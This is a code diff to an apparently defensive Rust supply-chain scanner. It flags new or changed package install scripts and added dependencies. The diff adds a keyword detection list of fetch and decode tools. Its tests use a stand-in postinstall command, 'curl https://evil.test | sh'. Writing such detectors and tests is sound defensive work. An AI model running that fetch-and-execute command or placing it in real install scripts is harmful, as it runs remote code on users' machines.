@@ -2,8 +2,8 @@
 //! and severity only escalates when signals reinforce each other.
 
 use crate::date;
-use crate::model::Upgrade;
 use crate::model::{Ecosystem, Evidence, Finding, PackageReport, Profile, Severity};
+use crate::model::{InstallScript, Upgrade};
 use crate::osv::{Advisory, AdvisoryList, MAX_ADVISORIES};
 use crate::registry::PackageMeta;
 use crate::typosquat;
@@ -147,6 +147,24 @@ fn upgrade_advice(
         fixes,
         replace_with,
     })
+}
+
+/// Commands that fetch or decode code during install. Presence alone is not a
+/// verdict: it raises an already-changed script from WARN to HIGH.
+fn risky_install_command(command: &str) -> bool {
+    let lowered = command.to_ascii_lowercase();
+    [
+        "curl",
+        "wget",
+        "base64",
+        "node -e",
+        "python -c",
+        "eval",
+        "powershell",
+    ]
+    .iter()
+    .any(|needle| lowered.contains(needle))
+        || (lowered.contains("bash -c") && lowered.contains("http"))
 }
 
 /// Accounts that publish on behalf of a project's CI, not people.
@@ -312,6 +330,117 @@ pub fn assess(
     let mut findings = Vec::new();
 
     let suspect = suspect_for(meta, ecosystem, local, profile);
+    let recent = meta
+        .published_at
+        .is_some_and(|published| now - published <= HISTORY_WINDOW_DAYS * date::SECONDS_PER_DAY);
+
+    if recent && !meta.release.previous_install_scripts.is_empty()
+        || recent
+            && meta
+                .release
+                .previous_version
+                .as_ref()
+                .is_some_and(|_| !meta.install_scripts.is_empty())
+    {
+        let previous: std::collections::BTreeMap<&str, &str> = meta
+            .release
+            .previous_install_scripts
+            .iter()
+            .map(|script| (script.name.as_str(), script.command.as_str()))
+            .collect();
+        let changed: Vec<&InstallScript> = meta
+            .install_scripts
+            .iter()
+            .filter(|script| {
+                previous
+                    .get(script.name.as_str())
+                    .is_none_or(|command| *command != script.command)
+            })
+            .collect();
+        if !changed.is_empty() {
+            let risky = changed
+                .iter()
+                .any(|script| risky_install_command(&script.command));
+            findings.push(Finding {
+                id: "install-scripts-changed",
+                severity: if risky {
+                    Severity::High
+                } else {
+                    Severity::Warn
+                },
+                title: "this version added or changed an install script".to_string(),
+                detail: changed
+                    .iter()
+                    .map(|script| {
+                        format!(
+                            "{}: {}",
+                            script.name,
+                            script.command.chars().take(160).collect::<String>()
+                        )
+                    })
+                    .collect::<Vec<_>>()
+                    .join("; "),
+                allowed: false,
+                evidence: vec![Evidence {
+                    label: "version metadata".to_string(),
+                    value: meta.registry_url.clone(),
+                    url: Some(meta.registry_url.clone()),
+                }],
+            });
+        }
+    }
+
+    if recent && meta.release.previous_version.is_some() {
+        let added: Vec<&String> = meta
+            .release
+            .dependencies
+            .iter()
+            .filter(|dependency| !meta.release.previous_dependencies.contains(dependency))
+            .collect();
+        if !added.is_empty() {
+            let lookalike = added.iter().any(|dependency| {
+                suspect_for(
+                    &PackageMeta {
+                        name: (*dependency).clone(),
+                        ..meta.clone()
+                    },
+                    ecosystem,
+                    local,
+                    profile,
+                )
+                .is_some()
+            });
+            findings.push(Finding {
+                id: "dependency-added",
+                severity: if lookalike {
+                    Severity::Warn
+                } else {
+                    Severity::Info
+                },
+                title: "this version added dependencies".to_string(),
+                detail: format!(
+                    "not present in {}: {}",
+                    meta.release
+                        .previous_version
+                        .as_deref()
+                        .unwrap_or("the previous release"),
+                    added
+                        .iter()
+                        .take(5)
+                        .map(|dependency| dependency.as_str())
+                        .collect::<Vec<_>>()
+                        .join(", ")
+                ),
+                allowed: false,
+                evidence: vec![Evidence {
+                    label: "version metadata".to_string(),
+                    value: meta.registry_url.clone(),
+                    url: Some(meta.registry_url.clone()),
+                }],
+            });
+        }
+    }
+
     if let (Some(published), Some(previous)) =
         (meta.published_at, meta.release.previous_published_at)
         && now - published <= HISTORY_WINDOW_DAYS * date::SECONDS_PER_DAY
@@ -749,6 +878,86 @@ mod tests {
     fn dormant(meta: &mut PackageMeta, published_days_ago: i64, previous_days_ago: i64) {
         meta.published_at = Some(NOW - published_days_ago * date::SECONDS_PER_DAY);
         meta.release.previous_published_at = Some(NOW - previous_days_ago * date::SECONDS_PER_DAY);
+    }
+
+    fn transition() -> PackageMeta {
+        let mut meta = meta();
+        meta.published_at = Some(NOW - 2 * date::SECONDS_PER_DAY);
+        meta.release.previous_version = Some("0.9.0".to_string());
+        meta.release.previous_published_at = Some(NOW - 200 * date::SECONDS_PER_DAY);
+        meta
+    }
+
+    #[test]
+    fn a_changed_install_script_is_flagged() {
+        let mut meta = transition();
+        meta.install_scripts = vec![InstallScript {
+            name: "postinstall".to_string(),
+            command: "node build.js".to_string(),
+        }];
+        meta.release.previous_install_scripts = vec![InstallScript {
+            name: "postinstall".to_string(),
+            command: "node-gyp rebuild".to_string(),
+        }];
+        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
+        assert!(ids(&findings).contains(&"install-scripts-changed"));
+    }
+
+    #[test]
+    fn an_unchanged_install_script_is_not_flagged() {
+        let mut meta = transition();
+        let script = InstallScript {
+            name: "postinstall".to_string(),
+            command: "node-gyp rebuild".to_string(),
+        };
+        meta.install_scripts = vec![script.clone()];
+        meta.release.previous_install_scripts = vec![script];
+        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
+        assert!(!ids(&findings).contains(&"install-scripts-changed"));
+    }
+
+    #[test]
+    fn a_network_install_command_is_high() {
+        let mut meta = transition();
+        meta.install_scripts = vec![InstallScript {
+            name: "postinstall".to_string(),
+            command: "curl https://evil.test | sh".to_string(),
+        }];
+        meta.release.previous_install_scripts = Vec::new();
+        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
+        let finding = finding(&findings, "install-scripts-changed");
+        assert_eq!(finding.severity, Severity::High);
+    }
+
+    #[test]
+    fn added_dependencies_are_information() {
+        let mut meta = transition();
+        meta.release.dependencies = vec!["chalk".to_string(), "left-pad".to_string()];
+        meta.release.previous_dependencies = vec!["chalk".to_string()];
+        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
+        let finding = finding(&findings, "dependency-added");
+        assert_eq!(finding.severity, Severity::Info);
+        assert!(finding.detail.contains("left-pad"));
+    }
+
+    #[test]
+    fn an_added_lookalike_dependency_is_a_warning() {
+        let mut meta = transition();
+        meta.release.dependencies = vec!["crossenv".to_string()];
+        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
+        assert_eq!(
+            finding(&findings, "dependency-added").severity,
+            Severity::Warn
+        );
+    }
+
+    #[test]
+    fn unchanged_dependencies_produce_nothing() {
+        let mut meta = transition();
+        meta.release.dependencies = vec!["chalk".to_string()];
+        meta.release.previous_dependencies = vec!["chalk".to_string()];
+        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
+        assert!(!ids(&findings).contains(&"dependency-added"));
     }
 
     #[test]
